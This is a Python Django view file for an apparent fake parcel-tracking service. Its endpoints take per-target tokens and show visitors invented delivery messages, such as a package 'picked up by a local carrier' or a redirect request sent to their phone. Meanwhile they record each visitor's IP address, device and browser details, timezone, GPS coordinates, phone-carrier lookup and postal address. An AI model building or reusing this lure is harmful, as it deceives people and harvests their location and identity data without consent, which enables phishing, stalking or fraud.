import base64
import json
import logging

from typing import Optional
from api.serializers import AddressSerializer
from api.serializers import NotificationSerializer
from api.serializers import TokenSerializer
from api.serializers import TrackingDataSerializer
from common.api_clients import PostGridApiClient
from common.api_clients import TwilioApiClient
from common.api_types import HeaderData
from common.api_types import IpData
from common.api_types import LocaleData
from common.api_types import LocationData
from common.api_types import TimeData
from common.api_types import TwilioLookupResponse
from common.api_types import UserAgentData
from common.functions import get_ip_data
from common.functions import get_locale_data
from common.functions import get_location_data
from common.functions import get_time_data
from common.functions import get_user_agent_data
from django.conf import settings
from django.shortcuts import get_object_or_404
from rest_framework import mixins
from rest_framework import status
from rest_framework.decorators import action
from rest_framework.permissions import AllowAny
from rest_framework.request import Request
from rest_framework.response import Response
from rest_framework.viewsets import GenericViewSet
from tracking.models import Agent
from tracking.models import InterceptionData
from tracking.models import NotificationData
from tracking.models import TrackingData


logger = logging.getLogger(__name__)


class PackagesView(mixins.CreateModelMixin, GenericViewSet):
    lookup_field = "token"
    queryset = TrackingData.objects.all()
    serializer_class = TrackingDataSerializer
    permission_classes = [AllowAny]

    NO_HEADER_ERROR = {"detail": "Could not determin header data"}
    NO_TOKEN_ERROR = {"detail": "Token is required"}
    NO_TOKEN_OR_PHONE_ERROR = {"detail": "Token and phone number are required"}

    def getHeaderData(self, request: Request) -> Optional[HeaderData]:
        header_value = request.headers.get("X-Tracking-Payload")

        if header_value:
            logger.debug("X-Tracking-Payload header found")
            try:
                # Step 1: Decode base64 safely
                decoded_bytes = base64.b64decode(header_value)
                decoded_str = decoded_bytes.decode("utf-8")

                # Step 2: Parse JSON
                payload: HeaderData = HeaderData(**json.loads(decoded_str))

                # Step 3: Attach to request
                return payload
            # except (ValueError, json.JSONDecodeError, base64.binascii.Error) as e:
            except (ValueError, json.JSONDecodeError) as e:
                logger.warning(f"Invalid tracking payload: {e}")
                return None
        else:
            # No header found
            print("No X-Tracking-Payload header found")
            return None

    @action(
        detail=False,
        methods=["post"],
        url_path="notify",
        url_name="notify",
        serializer_class=NotificationSerializer,
    )
    def notify(self, request: Request) -> Response:
        serializer = NotificationSerializer(data=request.data)

        if not serializer.is_valid(raise_exception=True):
            return Response(self.NO_TOKEN_OR_PHONE_ERROR, status=status.HTTP_400_BAD_REQUEST)

        token = serializer.validated_data["token"]
        http_method = serializer.validated_data["method"]
        phone = serializer.validated_data["phone"]
        agent = get_object_or_404(Agent, token=token)
        header_data: Optional[HeaderData] = self.getHeaderData(request)

        if not header_data:
            return Response(self.NO_HEADER_ERROR, status=status.HTTP_400_BAD_REQUEST)

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)
        print(f"ip data: {ip_data}")

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Handle notifications if provided
        twilio_client: TwilioApiClient = TwilioApiClient(
            settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN
        )
        phone_data: Optional[TwilioLookupResponse] = twilio_client.get_data(phone)

        # Create tracking data
        NotificationData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
            _phone_data=phone_data.model_dump() if phone_data else None,
        )

        return Response(
            {
                "status": "success",
                "detail": "✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(
        detail=False,
        methods=["post"],
        url_path="track",
        url_name="track",
        serializer_class=TokenSerializer,
    )
    def track(self, request: Request) -> Response:
        serializer = TokenSerializer(data=request.data)

        if not serializer.is_valid(raise_exception=True):
            return Response(self.NO_TOKEN_ERROR, status=status.HTTP_400_BAD_REQUEST)

        token = serializer.validated_data["token"]
        http_method = serializer.validated_data["method"]
        agent = get_object_or_404(Agent, token=token)
        header_data: Optional[HeaderData] = self.getHeaderData(request)

        if not header_data:
            return Response(self.NO_HEADER_ERROR, status=status.HTTP_400_BAD_REQUEST)

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)
        print(f"ip data: {ip_data}")

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Create tracking data
        TrackingData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
        )

        # return Response(
        #     {
        #         "status": "success",
        #         "detail": "✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.",
        #     },
        #     status=status.HTTP_201_CREATED,

        return Response(
            {
                "status": "success",
                "detail": "✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(
        detail=False,
        methods=["post"],
        url_path="intercept",
        url_name="intercept",
        serializer_class=AddressSerializer,
    )
    def intercept(self, request: Request) -> Response:
        serializer = AddressSerializer(data=request.data)

        if not serializer.is_valid(raise_exception=True):
            return Response(self.NO_TOKEN_ERROR, status=status.HTTP_400_BAD_REQUEST)

        token = serializer.validated_data["token"]
        http_method = serializer.validated_data["method"]
        agent = get_object_or_404(Agent, token=token)
        header_data: Optional[HeaderData] = self.getHeaderData(request)

        if not header_data:
            return Response(self.NO_HEADER_ERROR, status=status.HTTP_400_BAD_REQUEST)

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)
        print(f"ip data: {ip_data}")

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Prepare address data for PostGrid API
        address_data = {
            "recipient": serializer.validated_data.get("recipient", ""),
            "line1": serializer.validated_data.get("line1", ""),
            "line2": serializer.validated_data.get("line2", ""),
            "city": serializer.validated_data.get("city", ""),
            "provinceOrState": serializer.validated_data.get("provinceOrState", ""),
            "postalOrZip": serializer.validated_data.get("postalOrZip", ""),
            "country": serializer.validated_data.get("country", ""),
        }

        # Verify address using PostGrid API
        postgrid_client: PostGridApiClient = PostGridApiClient(settings.POSTGRID_AUTH_TOKEN)
        verification_result = postgrid_client.verify_address(address_data)

        if not verification_result:
            return Response(
                {
                    "status": "error",
                    "detail": "Failed to verify address. Please try again later.",
                },
                status=status.HTTP_500_INTERNAL_SERVER_ERROR,
            )

        # Create tracking data
        InterceptionData.objects.create(
            agent=agent,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
        )

        # Prepare response based on verification result
        if verification_result.data and verification_result.data.errors:
            return Response(
                {
                    "status": "warning",
                    "detail": "Address verification completed with warnings.",
                    "verification": {
                        "status": verification_result.data.status,
                        "verified_address": {
                            "line1": verification_result.data.line1,
                            "line2": verification_result.data.line2,
                            "city": verification_result.data.city,
                            "provinceOrState": verification_result.data.province_or_state,
                            "postalOrZip": verification_result.data.postal_or_zip,
                            "country": verification_result.data.country,
                        },
                        "errors": verification_result.data.errors,
                    },
                },
                status=status.HTTP_200_OK,
            )

        return Response(
            {"status": "success", "detail": "✅ Address verified successfully."},
            status=status.HTTP_201_CREATED,
        )
